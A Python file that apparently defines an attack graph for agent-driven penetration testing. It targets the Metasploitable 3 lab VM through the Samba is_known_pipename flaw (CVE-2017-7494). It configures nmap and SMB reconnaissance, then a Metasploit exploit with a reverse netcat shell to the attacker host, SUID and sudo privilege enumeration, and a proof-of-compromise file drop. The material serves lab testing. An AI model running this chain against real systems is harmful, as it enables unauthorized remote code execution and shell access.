"""
Example Attack Graph: Samba is_known_pipename RCE (Metasploitable 3)

Unauthenticated service-level exploit chain against MS3's Samba on port
445. CVE-2017-7494 (is_known_pipename / "SambaCry") lets an attacker who
can write to a writable share load a malicious shared library, which the
Samba daemon then loads -- giving arbitrary code execution as the smbd
user.

Chain:
  recon            — nmap full scan
  smb_enum         — enumerate SMB shares to confirm a writable share
  samba_rce        — exploit/linux/samba/is_known_pipename -> command shell
  privesc_lookup   — id / sudo -l / find SUID enumeration on the new shell
  file_drop        — write proof-of-compromise file and read it back

Expected: clean run lands a shell via the writable share. privesc_lookup
should honestly report whatever escalation surface exists from the shell,
which the replanner can use to decide whether to escalate or wrap up with
file_drop.
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)


def build_samba_pipename_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the Metasploitable 3 target via the Samba "
                  "is_known_pipename vulnerability (CVE-2017-7494) on port "
                  "445. Land a command shell, enumerate privileges from the "
                  "shell, and drop a proof-of-compromise file.",
        target_ip=target_ip,
        name=f"samba_pipename_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="Samba is_known_pipename unauth RCE baseline against MS3.",
        metadata={"scenario": "samba_pipename_rce", "target_type": "metasploitable3"},
    )

    # =========================================================================
    # NODES
    # =========================================================================

    graph.add_node(AttackNode(
        id="recon",
        label="Nmap Full Scan",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's attack surface and confirm Samba on 445",
        objective=f"Full port scan with service versioning on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -sV -p 0-65535 {target_ip}"],
        tags=["nmap", "full_scan"],
    ))

    graph.add_node(AttackNode(
        id="smb_enum",
        label="Enumerate SMB Shares",
        tactic=Tactic.DISCOVERY.value,
        technique_id="T1135",
        technique_name="Network Share Discovery",
        agent_type="recon",
        goal="Confirm Samba is reachable and identify a writable share",
        objective=f"Enumerate SMB shares on {target_ip}:445 to confirm Samba "
                  f"is exploitable and find a writable share.",
        target_ip=target_ip,
        tool_name="ssh",
        commands_to_run=[
            f"nmap -p445 --script smb-enum-shares {target_ip}",
            f"smbclient -L //{target_ip} -N",
        ],
        max_retries=1,
        tags=["smb", "shares", "enum"],
    ))

    graph.add_node(AttackNode(
        id="samba_rce",
        label="Samba is_known_pipename RCE",
        tactic=Tactic.INITIAL_ACCESS.value,
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        agent_type="exploit",
        goal="Obtain a command shell via Samba is_known_pipename",
        objective=f"Run exploit/linux/samba/is_known_pipename against "
                  f"{target_ip}:445 to load a malicious shared library via a "
                  f"writable share; payload cmd/unix/reverse_netcat.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/linux/samba/is_known_pipename",
        module_options={
            "RHOSTS": target_ip,
            "RPORT": 445,
        },
        payload="cmd/unix/reverse_netcat",
        payload_options={
            "LHOST": attacker_ip,
            "LPORT": 4452,
        },
        max_retries=3,
        tags=["samba", "is_known_pipename", "rce", "unauth"],
    ))

    graph.add_node(AttackNode(
        id="privesc_lookup",
        label="Enumerate Privesc Vectors from Shell",
        tactic=Tactic.PRIVILEGE_ESCALATION.value,
        technique_id="T1082",
        technique_name="System Information Discovery",
        agent_type="privesc",
        goal="Identify whether the smbd shell can reach root",
        objective="Enumerate id, sudo, SUID binaries, and writable system paths "
                  "from the newly opened session.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "id",
            "whoami",
            "uname -a",
            "sudo -n -l",
            "find / -perm -4000 -type f 2>/dev/null | head -20",
        ],
        max_retries=1,
        tags=["privesc", "enum", "suid"],
    ))

    graph.add_node(AttackNode(
        id="file_drop",
        label="Drop Proof-of-Compromise File",
        tactic=Tactic.IMPACT.value,
        technique_id="T1485",
        technique_name="Data Destruction",
        agent_type="impact",
        goal="Demonstrate compromise with a written artifact",
        objective="Write a proof-of-compromise file via the session and read it back.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "echo '{marker}' > {target_file}",
            "echo \"Compromised at $(date)\" >> {target_file}",
            "echo \"User: $(whoami)\" >> {target_file}",
            "cat {target_file}",
        ],
        command_params={
            "target_file": "/tmp/pwned_samba.txt",
            "marker": "PWNED via Samba is_known_pipename",
        },
        command_params_alternatives={
            "target_file": ["/var/tmp/pwned_samba.txt", "/dev/shm/pwned_samba.txt"],
        },
        max_retries=3,
        metadata={"target_file": "/tmp/pwned_samba.txt"},
        tags=["impact", "file_drop", "proof"],
    ))

    # =========================================================================
    # EDGES
    # =========================================================================

    graph.connect(
        "recon", "smb_enum",
        checks=[
            EdgeCheck(
                field="ports", operator="any_port",
                expected={"port": 445},
                description="Samba service is open on 445",
            ),
        ],
        evidence="Nmap found Samba on port 445",
        rationale="Enumerate SMB shares before firing the exploit",
    )

    graph.connect(
        "smb_enum", "samba_rce",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="SMB shares enumerated",
            ),
        ],
        evidence="Writable SMB share confirmed",
        rationale="Exploitable Samba -- fire is_known_pipename",
    )

    graph.connect(
        "samba_rce", "privesc_lookup",
        checks=[
            EdgeCheck(
                field="session_id", operator="exists",
                description="Command shell session opened",
            ),
        ],
        evidence="Got command shell via Samba is_known_pipename",
        rationale="Enumerate privesc paths from the new shell",
    )

    graph.connect(
        "privesc_lookup", "file_drop",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="Session is usable",
            ),
        ],
        evidence="Session privileges enumerated",
        rationale="Drop the proof-of-compromise file as the impact step",
    )

    return graph


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    graph = build_samba_pipename_graph(
        target_ip="192.168.34.7",
        attacker_ip="192.168.34.6",
    )
    print(graph.summary())
    print()

    out_path = "examples/samba_pipename_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")

    loaded = AttackGraph.load(out_path)
    print(f"\nReloaded: {loaded}")
    print(f"Ready nodes: {loaded.ready_nodes()}")
